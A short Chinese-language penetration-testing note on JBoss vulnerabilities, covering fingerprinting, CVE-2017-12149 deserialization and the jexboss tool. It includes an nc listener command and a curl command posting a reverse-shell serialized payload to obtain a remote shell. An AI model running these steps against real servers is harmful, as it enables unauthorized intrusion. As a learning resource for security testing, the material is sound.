JBoss常见漏洞:
JBoss 弱口令漏洞
JBoss 反序列化漏洞
JBoss 后台部署war包getshell

JBoss的8080端口，有jboss.css，响应头有X-Powered-By:JBOSSAS-6
后台:8080/admin-console


^
## **JBoss反序列化漏洞**
JBoss反序列化漏洞（Httplnvoker 组件（CVE-2017-12149））
版本：jboss5.x/6.x，访问/invoker/readonly返回500，说明页面存在，此页面存在反序列化漏洞
原理：存在于Jboss的Httplnvoker组件中的ReadOnlyAccessFilter过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了攻击者可以在服务器上执行任意代码。
漏洞验证访问/invoker/readonly，，返回500，说明此页面存在反序列化。
漏洞过程：
开两个终端，一个进行监听（nc -lvnp 12345），另一个发payload
```
curl http://192.168.50.169:8080/invoker/readonly --data-binary@ReverseShellCommonsCollectionsHashMap.ser
```
(@不能省略)
最后，成功反弹shell


^
版本：Jboss4.x，访问/jbossmq-httpil/HTTPServerlLServlet，返回This is the JBossMQ HTTP-IL，说明页面存在，此页面存在反序列化漏洞



## **工具利用**
也可直接利用工具：jexboss (python2、3均可)，可安装在Kali。
Jexboss是一个使用Python编写的Jboss漏洞检测利用工具，通过它可以检测并利用web-console，jmx-console，JMXlnvokerServlet这三个漏洞，并且可以获得一个shell。
工具下载:https://github.com/joaomatosf/jexboss
此工具除了可以对Jboss框架进行漏洞检测，还可以对其它Java平台、框架、应用等反序列化漏洞进行检测。
python3  jexboss.py -u xx.xx:8080
利用漏洞反弹shell。
输入公网反弹shell监听地址。
成功反弹shell。
新版本也可以直接回显远程命令执行。
